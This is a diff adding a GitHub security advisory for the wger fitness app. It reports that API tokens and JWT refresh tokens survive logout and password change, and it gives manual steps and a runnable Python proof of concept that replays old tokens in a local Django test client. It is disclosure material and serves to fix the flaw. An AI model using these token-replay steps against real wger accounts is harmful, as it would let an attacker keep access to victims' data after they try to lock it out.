@@ -1,0 +1,65 @@
+{
+  "id": "GHSA-v3x9-6gg8-c2c9",
+  "modified": "2026-10-07T14:16:45.025133469Z",
+  "published": "2026-10-07T13:59:10Z",
+  "aliases": [
+    "CVE-2026-46437"
+  ],
+  "summary": "wger: API credentials remain valid after logout/password change",
+  "details": "### Summary\n\nA vulnerability exists in the authentication/session lifecycle of `wger` where **bearer-style API credentials** remain valid **after a user logs out and after a user changes their password**. An attacker who steals a victim’s **DRF authtoken** (`Authorization: Token ...`) or **JWT refresh token** can continue to access protected `/api/v2/*` endpoints until the token is manually rotated/deleted (DRF token) or naturally expires (JWT refresh).\nlifecycle events do not revoke these credentials:\n- **Logout** (`/user/logout`) only clears the Django session cookie via `django_logout()` and does not revoke API tokens.\n- **Password change** updates the password hash, but does not revoke:\n  - existing DRF tokens stored in `authtoken_token`\n  - existing JWT refresh tokens (no server-side revocation list or token versioning); refresh can continue minting new access tokens until refresh expiry.\n\n\n#### Vulnerable Files\n\n- `wger/wger/core/views/user.py` (logout implementation)\n- `wger/settings/settings_global.py` (DRF auth configuration, SimpleJWT defaults)\n- `wger/settings/main.py` (commonly used production defaults for JWT lifetimes)\n- `wger/wger/utils/api_token.py` (authtoken rotation is manual only)\n\n### PoC (Proof of Concept)\n\n#### Manual Exploitation Steps\n\n1. Create a user account.\n2. Obtain a JWT refresh token:\n   - `POST /api/v2/token` with username/password.\n3. Obtain a DRF token (API key):\n   - use `/user/api-key` (or create token via admin/DB in a test environment).\n4. Change password:\n   - `POST /\u003clang\u003e/user/password/change` with `old_password`, `new_password1`, `new_password2`.\n5. Prove token replay:\n   - Call a private endpoint using the *old* DRF token (should still return `200`).\n   - Call `POST /api/v2/token/refresh` using the *old* refresh token (should still return `200` and a new access token).\n\n#### Automation PoC (Python)\n\nCopy/paste runnable PoC (Django in-process test client; no dev server required):\n\n```python\nimport json\nimport os\n\n\ndef main() -\u003e None:\n    \"\"\"\n    PoC for IDENTITY-VULN-01:\n    Proves that password change does not revoke:\n      - DRF authtoken (Authorization: Token \u003ckey\u003e)\n      - JWT refresh tokens (still mint access tokens)\n\n    This PoC runs entirely in-process using Django's test client + DRF APIClient.\n    It does not require running the dev server.\n    \"\"\"\n\n    os.environ.setdefault(\"DJANGO_SETTINGS_MODULE\", \"settings.main\")\n    # Ensure we use the local sqlite DB path used during setup\n    os.environ.setdefault(\"DJANGO_DB_DATABASE\", \"db.sqlite3\")\n    os.environ.setdefault(\"DJANGO_MEDIA_ROOT\", \"media\")\n\n    import django\n\n    django.setup()\n\n    from django.conf import settings\n    from django.contrib.auth.models import User\n    from django.test import Client\n    from rest_framework.authtoken.models import Token\n    from rest_framework.test import APIClient\n\n    username = \"pwchange_user_poc\"\n    old_pw = \"OldPassw0rd!\"\n    new_pw = \"NewPassw0rd!\"\n\n    # Create a clean user + DRF token\n    User.objects.filter(username=username).delete()\n    user = User.objects.create_user(username=username, password=old_pw)\n    Token.objects.filter(user=user).delete()\n    drf_token = Token.objects.create(user=user).key\n\n    api = APIClient()\n\n    # Obtain JWT tokens with old password (proof baseline)\n    r_obtain = api.post(\"/api/v2/token\", {\"username\": username, \"password\": old_pw}, format=\"json\")\n    refresh = getattr(r_obtain, \"data\", {}).get(\"refresh\")\n\n    # Change password through the actual password change endpoint\n    web = Client()\n    web.force_login(user)\n    r_pw = web.post(\n        \"/en/user/password/change\",\n        data={\"old_password\": old_pw, \"new_password1\": new_pw, \"new_password2\": new_pw},\n        follow=False,\n    )\n\n    # Old password should fail now (sanity check)\n    r_obtain_old = api.post(\n        \"/api/v2/token\",\n        {\"username\": username, \"password\": old_pw},\n        format=\"json\",\n    )\n\n    # New password should work\n    r_obtain_new = api.post(\n        \"/api/v2/token\",\n        {\"username\": username, \"password\": new_pw},\n        format=\"json\",\n    )\n\n    # DRF token remains valid (private endpoint still accessible)\n    api.credentials(HTTP_AUTHORIZATION=f\"Token {drf_token}\")\n    r_drf = api.get(\"/api/v2/weightentry/\")\n\n    # Old refresh remains valid (still mints a new access token)\n    api.credentials()\n    r_refresh = api.post(\"/api/v2/token/refresh\", {\"refresh\": refresh}, format=\"json\")\n\n    out = {\n        \"jwt_refresh_lifetime_seconds\": int(settings.SIMPLE_JWT[\"REFRESH_TOKEN_LIFETIME\"].total_seconds()),\n        \"jwt_access_lifetime_seconds\": int(settings.SIMPLE_JWT[\"ACCESS_TOKEN_LIFETIME\"].total_seconds()),\n        \"jwt_obtain_oldpw_before_change\": r_obtain.status_code,\n        \"password_change_status\": r_pw.status_code,\n        \"jwt_obtain_oldpw_after_change\": r_obtain_old.status_code,\n        \"jwt_obtain_newpw_after_change\": r_obtain_new.status_code,\n        \"drf_token_private_api_after_change\": r_drf.status_code,\n        \"jwt_refresh_with_old_refresh_after_change\": r_refresh.status_code,\n        \"jwt_refresh_response_keys\": sorted(list(getattr(r_refresh, \"data\", {}).keys())),\n    }\n\n    print(json.dumps(out, indent=2))\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\nExpected output (example from a successful run):\n\n```json\n{\n  \"jwt_refresh_lifetime_seconds\": 86400,\n  \"jwt_access_lifetime_seconds\": 900,\n  \"jwt_obtain_oldpw_before_change\": 200,\n  \"password_change_status\": 302,\n  \"jwt_obtain_oldpw_after_change\": 401,\n  \"jwt_obtain_newpw_after_change\": 200,\n  \"drf_token_private_api_after_change\": 200,\n  \"jwt_refresh_with_old_refresh_after_change\": 200,\n  \"jwt_refresh_response_keys\": [\n    \"access\"\n  ]\n}\n```\n\n### Impact\nA user logs into the wger mobile app, their DRF token is intercepted via a MitM on a public WiFi network. The user notices suspicious activity, changes their password and logs out. Despite these remediation steps, the attacker's copy of the token remains fully valid.\nIf an attacker obtains a victim’s API credential once, the victim’s primary remediation actions (**logout** and **password change**) do not terminate attacker access.\n- **Confidentiality:** attacker retains access to victim’s private API data (depends on endpoints used).\n- **Integrity:** attacker can perform any API mutations permitted to the victim’s account.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "wger",
+        "purl": "pkg:pypi/wger"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "2.1"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "1.1",
+        "1.1.1",
+        "1.2",
+        "1.2rc1",
+        "1.3",
+        "1.4",
+        "1.5",
+        "1.6",
+        "1.6.1",
+        "1.7",
+        "1.8",
+        "1.9",
+        "2.0",
+        "2.1"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-v3x9-6gg8-c2c9/GHSA-v3x9-6gg8-c2c9.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/wger-project/wger/security/advisories/GHSA-v3x9-6gg8-c2c9"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/wger-project/wger"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/wger-project/wger/releases/tag/2.6"
+    }
+  ]
+}
